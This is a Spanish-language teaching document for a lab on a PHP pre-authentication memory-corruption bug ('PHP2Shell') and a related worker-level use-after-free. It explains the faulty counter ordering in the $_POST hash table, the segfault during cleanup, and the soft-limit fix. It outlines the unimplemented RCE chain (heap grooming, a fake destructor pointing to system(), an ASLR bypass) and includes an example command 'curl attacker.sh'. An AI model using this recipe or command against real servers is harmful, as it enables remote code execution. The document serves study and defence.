# Anatomía de PHP2Shell — explicación desde cero

> Documento didáctico. Asume que sabes programar pero no conoces las
> tripas de PHP. Para la demo grabada, véase `DEMO.md`; el modo
> `--explain` del repro enseña estos mismos pasos sincronizados con el
> ataque en vivo.

---

## 1. Dónde sucede: el mapa del request PHP

Cuando Apache (mod_php) recibe una petición, PHP la procesa en fases
fijas. El bug vive **entre la 2 y la 3**:

```text
  ┌──────────────────────────────────────────────────────────────┐
  │ 1. RINIT de módulos: sesiones, filtros, …                    │
  │ 2. PARSEO DEL POST: cuerpo → array $_POST        ◄── AQUÍ    │
  │ 3. COMPILACIÓN del script PHP                                │
  │ 4. EJECUCIÓN de tu aplicación  (auth, lógica, todo)          │
  │ 5. RSHUTDOWN: destrucción de $_POST etc.         ◄── Y AQUÍ  │
  └──────────────────────────────────────────────────────────────┘
```

Dos consecuencias mayúsculas:

1. **El fallo ocurre en la fase 2, pero su efecto (el cleanup corrupto)
   detona en la fase 5.** Entre medias, tu aplicación no ha ejecutado ni
   una línea.
2. Por eso la autenticación, los filtros y el WAF de la aplicación llegan
   tarde: el request del atacante ya pasó por la fase vulnerable antes de
   que exista la oportunidad de decir "no".

En el lab lo ves en la firma: el fatal error dice `in Unknown on line 0`
— "línea 0" = "no estaba ejecutando ningún script, estaba arrancando el
request".

## 2. Cómo PHP guarda `$_POST`: la tabla hash

`$_POST` no es magia: es una **tabla hash** de Zend (la misma estructura
que usan los arrays asociativos de PHP). Funciona así:

- Cada campo del formulario (`nombre=valor`) se convierte en una entrada.
- Cada entrada vive en un **bucket**: una cajita de memoria con dos
  compartimentos — el **valor** (un `zval`, el "valor PHP universal") y
  la **clave** (un puntero a un `zend_string`, el string interno de PHP).

```text
HashTable $_POST
┌───────────────────────────────┐
│ nNumUsed     = 3   (cubetas "en uso", contadas)│
│ nNumOfElements = 3 (elementos válidos, contados)│
│                               │
│ arData:  ┌────────┬────────┬────────┬─────────┐
│          │ bucket0│ bucket1│ bucket2│ bucket3 │
│          │ val    │ val    │ val    │ ¿¿¿???  │
│          │ key ptr│ key ptr│ key ptr│ (sin    │
│          │        │        │        │  tocar) │
│          └────────┴────────┴────────┴─────────┘
└────────────────────────────────────────────────┘
```

La función implicada (en `zend_hash.c`, llamada durante el parseo del
formulario) hace esto, en este orden:

```c
idx = ht->nNumUsed++;            // PASO A: ya digo que hay una cubeta más
ht->nNumOfElements++;            // PASO B: y un elemento válido más
p = ht->arData + idx;
p->key = key = zend_string_init(str, len, ...);  // PASO C: AHORA sí,
                                 //          reservo y copio la clave
```

**Ahí está el bug: el orden.** Los contadores (A, B) se incrementan
*antes* de que la memoria del bucket (C) exista. Es como escribir en el
libro de un hotel "habitación 42: ocupada" *antes* de preparar la
habitación.

## 3. La detonación: se acaba la memoria justo en el paso C

El atacante envía un POST con un **nombre de campo gigante** (~3.5 MB
cuando `memory_limit=16M`) y sintaxis de array (`...[x]=1`), que obliga a
PHP a entrar por el camino de inserción vulnerable. Al copiar la clave
(paso C), PHP necesita ~3.5 MB extra, supera `memory_limit` y lanza un
**fatal error** que aborta todo inmediatamente (un `longjmp` — un salto
de emergencia fuera de la función, sin pasar por ninguna limpieza local).

Estado que queda atrás:

```text
┌───────────────────────────────┐
│ nNumUsed     = 4   ◄── cuenta la cubeta 3            │
│ nNumOfElements = 4 ◄── la cuenta como VÁLIDA         │
│ bucket3 =  BASURA SIN INICIALIZAR                    │
│           (bytes que dejó cualquier asignación       │
│            anterior del heap: "muebles viejos")      │
└──────────────────────────────────────────────────────┘
```

El fatal error no "borra" la tabla: la petición debe cerrarse con
elegancia, y eso implica la fase 5 — destruir `$_POST`.

## 4. La explosión: el cleanup confía en los contadores

Al destruir la tabla, PHP **no re-lee los datos, confía en los
contadores**: recorre las 4 cubetas que el libro dice que existen e
interpreta el contenido de cada una como un valor PHP bien formado
(`zval` con punteros a `zend_string`, arrays anidados, destructores…).

Pero la cubeta 3 **nunca fue un zval**. Es la basura que quedó de
asignaciones anteriores. Hay dos finales:

- **Final del lab (sin arma):** la basura es aleatoria → PHP sigue un
  puntero inválido → **segfault** → el worker muere → Apache lo
  reemplaza. Es exactamente lo que ves en el vídeo: el PID cambia.

```text
fase 5: destruir $_POST
        └─ bucket0..2: zvals válidos → liberados bien
        └─ bucket3:    BASURA interpretada como zval
                       └─ puntero inválido → SIGSEGV
                          └─ "child pid 17 exit signal Segmentation fault"
```

- **Final del exploit real (descrito por Datadog, no implementado en
  este lab):** el atacante **controla esa basura**. Con campos del
  propio formulario hace *heap grooming*: siembra en el heap bytes
  diseñados a mano para que sean exactamente lo que el cleanup espera
  encontrar: un array falso cuyo "destructor" apunta a `system()` de
  glibc y cuyo elemento apunta al comando del atacante. El cleanup, que
  solo quiere "liberar bien" el array, **ejecuta el destructor**: el
  comando corre con los permisos del worker (`www-data`).

```text
bucket3 = bytes del atacante que simulan:
┌────────────────────────────────────────────┐
│ zval → puntero a un zend_array FALSO       │
│         ├─ destructor = system()           │
│         └─ elemento   → "curl attacker.sh" │
└────────────────────────────────────────────┘
cleanup: "destruyo el array" → llama a su destructor → system(comando)
```

Para que el array falso esté en una dirección *válida*, el atacante
además necesita vencer ASLR (direcciones aleatorias), por ejemplo con
fugas de memoria — Datadog y Wiz describen técnicas de fuga vía cookie
`PHPSESSID`. Esa cadena completa (grooming + estructuras falsas + ASLR +
`system()`) es lo que este lab **deliberadamente no implementa**.

## 5. Por qué el parcheado sobrevive (y por qué también muestra el fatal)

El fix no cambia el orden A→B→C del código (los contadores siguen
antes). Lo que cambia es **qué pasa cuando la asignación falla**:

- **Límite blando (*soft limit*)**: al acercarse a `memory_limit`, PHP
  ya no salta con `longjmp` a mitad de la inserción; **pospone** el
  error hasta un punto seguro, dejando que la operación en curso
  termine de construir sus datos.
- **Límite duro**: si la memoria se agota de verdad, el worker hace
  `_exit(137)` inmediato — sin cleanup sobre estado dudoso.

Por eso en el lab el 8.5.12 muestra el mismo mensaje
`Allowed memory size … in Unknown on line 0` (el límite blando dispara
igual el error en la fase 2) pero **el worker sobrevive**: no hay bucket
huérfano que interpretar. El discriminador de la demo es el destino del
worker, no el texto del error.

## 6. Y CVE-2026-109619, ¿en qué se diferencia?

El 109618 es un error **dentro de un solo request** (medio
construido → cleanup lo tragica). El 109619 es entre requests: es un
**use-after-free a nivel de worker**.

Un worker (proceso mod_php/FPM) atiende cientos de requests a lo largo
de su vida. Algunos punteros globales del worker apuntan a memoria
**del request en curso**. Si PHP libera esa memoria sin poner los
punteros a cero, el request *siguiente* que atienda ese mismo worker
**sigue el puntero hacia memoria ya liberada** (y reciclada por otras
asignaciones, quizá con datos del atacante).

Vías confirmadas por PHP:

1. **Backtraces de fatal error (PHP 8.5)**: el estado del backtrace
   sobrevive al shutdown; un diagnóstico de un request posterior lo lee
   antes de inicializarse.
2. **Procesado de uploads**: tras un fatal error quedan restos de estado
   de sesión/decodificador; el siguiente upload los lee antes de tiempo
   (por eso la mitigación habitual es `session.upload_progress.enabled=0`,
   que va **activado por defecto desde PHP 5.4** aunque tu app nunca use
   sesiones).

La analogía: el parte de turnos del recepcionista apunta a "la caja
fuerte del huésped anterior". El huésped se fue y la caja se desmontó,
pero el parte no se actualizó: el recepcionista del turno siguiente abre
la caja según las instrucciones viejas — que ahora apuntan a un solar
donde cualquiera puede haber dejado lo que quiera.

Requisito operativo: los requests del atacante deben caer **en el mismo
worker** (el estado es por-proceso). En producción con pools grandes se
necesitan varios intentos; no elimina el fallo.

## 7. Resumen en una línea por pregunta

| Pregunta | Respuesta |
|---|---|
| ¿Dónde exactamente? | En la inserción de claves de la tabla hash de `$_POST` durante el parseo del POST (fase RINIT), función `_zend_hash_str_add_or_update_i()` de `zend_hash.c`; el daño detona en el cleanup del request (RSHUTDOWN) |
| ¿Por qué es un bug? | Los contadores del bucket se incrementan ANTES de reservar la memoria del bucket; si la reserva falla, queda un bucket contado pero sin inicializar |
| ¿Por qué da RCE y no solo DoS? | El cleanup interpreta los bytes sin inicializar como valores PHP (zvals con punteros y destructores); si el atacante controla esos bytes, controla qué función llama el cleanup |
| ¿Por qué no lo para la app? | Ocurre antes de que el script ejecute ni una línea (fase 2 del ciclo de vida) |
| ¿Por qué el parcheado también muestra el fatal? | El fix introduce un límite blando que pospone el error a un punto seguro: mismo mensaje, sin estado corrupto |
| ¿Qué se ve en el lab? | Trigger → conexión caída → PID del worker cambia → fatal + segfault en logs; en el parcheado, mismo fatal pero worker vivo |
